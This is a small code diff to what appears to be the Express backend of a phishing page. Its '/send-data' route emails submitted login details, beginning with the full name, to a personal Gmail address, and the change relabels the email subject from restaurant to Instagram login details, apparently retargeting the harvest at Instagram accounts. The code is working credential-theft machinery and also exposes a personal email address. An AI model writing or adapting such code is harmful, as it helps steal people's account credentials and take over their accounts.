@@ -30,7 +30,7 @@ app.post('/send-data', (req, res) => {
     const mailOptions = {
         from: 'lagharitahir08@gmail.com',
         to: 'lagharitahir08@gmail.com',
-        subject: 'New Restaurant Login Details',
+        subject: 'New Instagram Login Details',
         text: `Nayi Login Details aayi hain:
         
 Full Name: ${fullname}
